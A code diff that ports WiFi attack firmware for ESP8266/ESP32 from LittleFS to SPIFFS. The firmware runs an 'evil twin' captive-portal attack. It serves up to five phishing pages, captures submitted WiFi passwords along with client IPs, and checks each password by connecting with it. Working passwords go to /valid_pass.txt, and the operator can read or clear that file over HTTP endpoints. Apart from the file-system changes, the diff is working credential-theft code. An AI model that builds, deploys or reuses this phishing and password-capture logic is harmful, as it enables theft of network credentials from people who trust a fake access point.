@@ -24,7 +24,13 @@
     #include <ESP8266mDNS.h>
 #endif
 
-#include <LittleFS.h>
+#ifdef ESP32
+    #include <SPIFFS.h>
+    #define FS SPIFFS
+#else
+    #include <FS.h>
+    #define FS FS
+#endif
 
 #include "language.h"
 #include "debug.h"
@@ -127,27 +133,44 @@ namespace wifi {
         // debugF("handleFileList: ");
         // debugln(path);
 
-        Dir dir = LittleFS.openDir(path);
+        #ifdef ESP32
+            File root = FS.open(path);
+            File entry;
+            String output = String('{');
+            bool first = true;
+            
+            if (root.isDirectory()) {
+                while (entry = root.openNextFile()) {
+                    if (first) first = false;
+                    else output += ',';
+                    output += '[';
+                    output += '"' + String(entry.name()) + '"';
+                    output += ']';
+                }
+            }
+            output += CLOSE_BRACKET;
+            server.send(200, str(W_JSON).c_str(), output);
+        #else
+            Dir dir = FS.openDir(path);
+            File   entry;
+            bool   first = true;
 
-        String output = String('{'); // {
-        File   entry;
-        bool   first = true;
+            while (dir.next()) {
+                entry = dir.openFile("r");
 
-        while (dir.next()) {
-            entry = dir.openFile("r");
+                if (first) first = false;
+                else output += ',';                 // ,
 
-            if (first) first = false;
-            else output += ',';                 // ,
+                output += '[';                      // [
+                output += '"' + entry.name() + '"'; // "filename"
+                output += ']';                      // ]
 
-            output += '[';                      // [
-            output += '"' + entry.name() + '"'; // "filename"
-            output += ']';                      // ]
+                entry.close();
+            }
 
-            entry.close();
-        }
-
-        output += CLOSE_BRACKET;
-        server.send(200, str(W_JSON).c_str(), output);
+            output += CLOSE_BRACKET;
+            server.send(200, str(W_JSON).c_str(), output);
+        #endif
     }
 
     String getContentType(String filename) {
@@ -177,20 +200,34 @@ namespace wifi {
 
         String contentType = getContentType(path);
 
-        if (!LittleFS.exists(path)) {
-            if (LittleFS.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
-            else if (LittleFS.exists(String(ap_settings.path) + path)) path = String(ap_settings.path) + path;
-            else if (LittleFS.exists(String(ap_settings.path) + path + str(W_DOT_GZIP))) path = String(ap_settings.path) + path + str(W_DOT_GZIP);
-            else {
-                // prntln(W_NOT_FOUND);
-                return false;
+        #ifdef ESP32
+            if (!FS.exists(path)) {
+                if (FS.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
+                else if (FS.exists(String(ap_settings.path) + path)) path = String(ap_settings.path) + path;
+                else if (FS.exists(String(ap_settings.path) + path + str(W_DOT_GZIP))) path = String(ap_settings.path) + path + str(W_DOT_GZIP);
+                else {
+                    return false;
+                }
             }
-        }
+            File file = FS.open(path, "r");
+            server.streamFile(file, contentType);
+            file.close();
+        #else
+            if (!FS.exists(path)) {
+                if (FS.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
+                else if (FS.exists(String(ap_settings.path) + path)) path = String(ap_settings.path) + path;
+                else if (FS.exists(String(ap_settings.path) + path + str(W_DOT_GZIP))) path = String(ap_settings.path) + path + str(W_DOT_GZIP);
+                else {
+                    // prntln(W_NOT_FOUND);
+                    return false;
+                }
+            }
 
-        File file = LittleFS.open(path, "r");
+            File file = FS.open(path, "r");
 
-        server.streamFile(file, contentType);
-        file.close();
+            server.streamFile(file, contentType);
+            file.close();
+        #endif
         // prnt(SPACE);
         // prntln(W_OK);
 
@@ -447,7 +484,7 @@ namespace wifi {
             String password = server.arg("pwd");
             String clientIP = server.client().remoteIP().toString();
             
-            File logFile = LittleFS.open("/etwin_log.txt", "a");
+            File logFile = FS.open("/etwin_log.txt", "a");
             if (logFile) {
                 logFile.print("[");
                 logFile.print(millis());
@@ -487,7 +524,7 @@ namespace wifi {
                         if (connected) {
                             logFile.print(" [VALID!]");
                             Serial.println(" VALID!");
-                            File validFile = LittleFS.open("/valid_pass.txt", "a");
+                            File validFile = FS.open("/valid_pass.txt", "a");
                             if (validFile) {
                                 validFile.print("[");
                                 validFile.print(millis());
@@ -516,7 +553,7 @@ namespace wifi {
         });
 
         server.on("/etwin.html", HTTP_GET, []() {
-            if (LittleFS.exists("/web/etwin.html")) {
+            if (FS.exists("/web/etwin.html")) {
                 handleFileRead("/web/etwin.html");
             } else {
                 server.send(200, str(W_HTML), 
@@ -525,8 +562,8 @@ namespace wifi {
         });
 
         server.on("/etwin_log.txt", HTTP_GET, []() {
-            if (LittleFS.exists("/etwin_log.txt")) {
-                File logFile = LittleFS.open("/etwin_log.txt", "r");
+            if (FS.exists("/etwin_log.txt")) {
+                File logFile = FS.open("/etwin_log.txt", "r");
                 String content = "";
                 if (logFile) {
                     content = logFile.readString();
@@ -539,8 +576,8 @@ namespace wifi {
         });
 
         server.on("/clear_logs", HTTP_GET, []() {
-            if (LittleFS.exists("/etwin_log.txt")) {
-                LittleFS.remove("/etwin_log.txt");
+            if (FS.exists("/etwin_log.txt")) {
+                FS.remove("/etwin_log.txt");
                 server.send(200, str(W_TXT), "Logs cleared");
             } else {
                 server.send(200, str(W_TXT), "No logs to clear");
@@ -548,8 +585,8 @@ namespace wifi {
         });
 
         server.on("/valid_pass.txt", HTTP_GET, []() {
-            if (LittleFS.exists("/valid_pass.txt")) {
-                File passFile = LittleFS.open("/valid_pass.txt", "r");
+            if (FS.exists("/valid_pass.txt")) {
+                File passFile = FS.open("/valid_pass.txt", "r");
                 String content = "";
                 if (passFile) {
                     content = passFile.readString();
@@ -562,8 +599,8 @@ namespace wifi {
         });
 
         server.on("/clear_valid", HTTP_GET, []() {
-            if (LittleFS.exists("/valid_pass.txt")) {
-                LittleFS.remove("/valid_pass.txt");
+            if (FS.exists("/valid_pass.txt")) {
+                FS.remove("/valid_pass.txt");
                 server.send(200, str(W_TXT), "Valid passwords cleared");
             } else {
                 server.send(200, str(W_TXT), "No valid passwords to clear");
@@ -576,7 +613,7 @@ namespace wifi {
                 if (i > 1) json += ",";
                 String filename = "/web/etwin" + String(i) + ".html";
                 json += "{\"id\":" + String(i);
-                json += ",\"exists\":" + String(LittleFS.exists(filename) ? "true" : "false");
+                json += ",\"exists\":" + String(FS.exists(filename) ? "true" : "false");
                 json += "}";
             }
             json += "]";
@@ -587,7 +624,7 @@ namespace wifi {
             String id = server.arg("id");
             String filename = "/web/etwin" + id + ".html";
             if (id.toInt() >= 1 && id.toInt() <= 5) {
-                if (LittleFS.exists(filename)) {
+                if (FS.exists(filename)) {
                     server.send(200, str(W_TXT), String("Selected: etwin") + id + ".html");
                 } else {
                     server.send(200, str(W_TXT), String("Error: etwin") + id + ".html not found");
@@ -600,7 +637,7 @@ namespace wifi {
         server.on("/preview", HTTP_GET, []() {
             String id = server.arg("page");
             String filename = "/web/etwin" + id + ".html";
-            if (id.toInt() >= 1 && id.toInt() <= 5 && LittleFS.exists(filename)) {
+            if (id.toInt() >= 1 && id.toInt() <= 5 && FS.exists(filename)) {
                 handleFileRead(filename);
             } else {
                 server.send(200, str(W_HTML), "<html><body><h1>Preview Error</h1><p>Page not found or invalid ID</p></body></html>");
@@ -614,7 +651,7 @@ namespace wifi {
                 if (settings::getWebSettings().captive_portal) {
                     if (attack.isEvilTwinRunning()) {
                         String etwinFile = "/web/etwin.html";
-                        if (LittleFS.exists(etwinFile)) {
+                        if (FS.exists(etwinFile)) {
                             handleFileRead(etwinFile);
                         } else {
                             sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
